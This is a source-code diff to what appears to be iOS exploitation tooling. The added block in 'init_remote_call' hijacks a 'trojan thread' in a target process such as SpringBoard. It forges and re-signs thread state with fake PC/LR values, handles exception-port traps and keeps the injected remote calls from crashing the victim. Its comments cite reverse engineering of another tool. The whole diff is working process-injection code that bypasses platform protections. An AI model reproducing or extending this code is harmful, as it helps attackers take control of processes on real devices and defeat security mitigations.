@@ -1667,6 +1667,33 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     sign_state(g_RC_trojanThreadAddr, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
     reply_with_state(&exc, &newState);
 
+    // Fl0rk (RemoteCallSession init @ 0x100e660dc..0x100e660f4): after replying
+    // FAKE_PC=0x101 / FAKE_LR=0x201, ALWAYS wait_exception(~1500ms) for that trap
+    // before any further remote call. Skipping this lets SpringBoard RET to raw
+    // 0x201 → SIGBUS (seen as consecutiveCrashCount SB IPS).
+    {
+        ExceptionMessage creatorExc;
+        int creatorWaitMS = 1500;
+        if (!wait_exception(firstExceptionPort, &creatorExc, creatorWaitMS, false)) {
+            printf("[%s:%d] FAKE_PC_TROJAN_CREATOR trap not received within %dms — SB would RET to 0x201\n",
+                   __FUNCTION__, __LINE__, creatorWaitMS);
+            remote_call_note_init_failure(RemoteCallInitFailureFirstExceptionTimeout, targetPid);
+            abandon_remote_call();
+            return -1;
+        }
+        // Park thread again at the same fake PC/LR so subsequent
+        // do_remote_call_temp can pick it up from a known trap.
+        sign_state(g_RC_trojanThreadAddr, &creatorExc.threadState,
+                   FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
+        reply_with_state(&creatorExc, &creatorExc.threadState);
+        // One more short drain — Fl0rk also loops wait after creator reply.
+        while (wait_exception(firstExceptionPort, &creatorExc, 100, false)) {
+            sign_state(g_RC_trojanThreadAddr, &creatorExc.threadState,
+                       FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
+            reply_with_state(&creatorExc, &creatorExc.threadState);
+        }
+    }
+
     if (g_RC_originalThreadOnly) {
         g_RC_creatingExtraThread = false;
         g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
